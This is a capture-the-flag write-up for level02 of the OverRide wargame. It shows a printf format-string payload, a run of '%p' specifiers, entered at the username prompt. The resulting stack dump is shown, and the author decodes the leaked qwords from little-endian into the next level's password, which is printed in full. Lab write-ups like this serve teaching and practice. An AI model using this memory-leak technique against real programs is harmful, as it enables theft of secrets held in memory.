We couldn't use gdb, ltrace, or strace because there was a file read operation for level03, and since these tools didn't have permission, the project would exit immediately.When we analyze the code, we saw that **printf** also had a vulnerability. We simply entered the following payload during the **username** input and read the variable that stored our password from memory. All we had to do was read it in little-endian format.


```
 AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
```


```
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
--[ Password: *****************************************
AAAA 0x7fffffffe4f0 (nil) 0x70 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6e8 0x1f7ff9a08 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025 (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) 0x2070252041414141 0x7025207025207025 0x2520702520702520 0x2070252070252070  does not have access!
```

```
0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d
```

```
4868373452506e75 51397361354a4145 58674e5743717a37 7358476e68354a35 4d394b6650673348
```

>[!TIP]
>Since it is an x86x64 system, we must convert the memory addresses to little endian before converting them to text.


```
4868373452506e75 51397361354a4145 58674e5743717a37 7358476e68354a35 4d394b6650673348
```

```
PASS = Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```